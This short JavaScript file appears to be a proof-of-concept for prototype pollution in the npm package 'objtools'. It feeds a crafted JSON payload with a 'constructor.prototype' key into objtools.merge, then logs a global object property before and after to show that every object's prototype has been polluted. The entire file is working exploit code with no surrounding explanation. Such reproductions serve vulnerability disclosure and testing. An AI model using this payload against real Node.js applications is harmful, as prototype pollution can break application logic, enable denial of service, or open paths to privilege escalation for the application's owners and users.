var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const objtools = require('objtools');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
objtools.merge(obj, payload);
console.log({}.polluted);